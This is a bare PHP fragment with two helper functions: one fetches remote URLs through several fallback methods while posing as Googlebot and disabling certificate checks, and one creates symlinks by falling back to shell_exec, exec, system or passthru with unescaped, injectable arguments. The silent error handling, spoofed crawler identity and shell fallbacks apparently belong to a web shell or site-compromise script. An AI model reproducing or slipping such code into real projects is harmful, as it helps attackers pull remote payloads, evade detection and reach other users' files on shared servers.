function x_request($url) {
    $content = false;
    $ua = 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)';

    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_USERAGENT, $ua);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        $content = curl_exec($ch);
        curl_close($ch);
    }

    if (!$content && ini_get('allow_url_fopen')) {
        $opts = ['http' => ['method' => 'GET', 'header' => "User-Agent: $ua\r\n", 'timeout' => 10]];
        $context = stream_context_create($opts);
        $content = @file_get_contents($url, false, $context);
    }

    if (!$content && ini_get('allow_url_fopen')) {
        $handle = @fopen($url, "r");
        if ($handle) {
            $content = @stream_get_contents($handle);
            fclose($handle);
        }
    }

    if (!$content) {
        $parts = parse_url($url);
        $host = $parts['host'];
        $path = isset($parts['path']) ? $parts['path'] : '/';
        $port = isset($parts['port']) ? $parts['port'] : 80;
        $scheme = isset($parts['scheme']) ? $parts['scheme'] : 'http';
        
        if ($scheme == 'https') {
            $host = 'ssl://' . $host;
            if ($port == 80) $port = 443;
        }

        $fp = @fsockopen($host, $port, $errno, $errstr, 10);
        if ($fp) {
            $out = "GET $path HTTP/1.1\r\nHost: {$parts['host']}\r\nUser-Agent: $ua\r\nConnection: Close\r\n\r\n";
            fwrite($fp, $out);
            $response = '';
            while (!feof($fp)) {
                $response .= fgets($fp, 128);
            }
            fclose($fp);
            $arr = explode("\r\n\r\n", $response, 2);
            if (isset($arr[1])) $content = $arr[1];
        }
    }
    return $content;
}

function x_link($target, $link) {
    if (function_exists('symlink')) {
        @symlink($target, $link);
    } elseif (function_exists('shell_exec')) {
        @shell_exec("ln -s '$target' '$link'");
    } elseif (function_exists('exec')) {
        @exec("ln -s '$target' '$link'");
    } elseif (function_exists('system')) {
        @system("ln -s '$target' '$link'");
    } elseif (function_exists('passthru')) {
        @passthru("ln -s '$target' '$link'");
    }
}
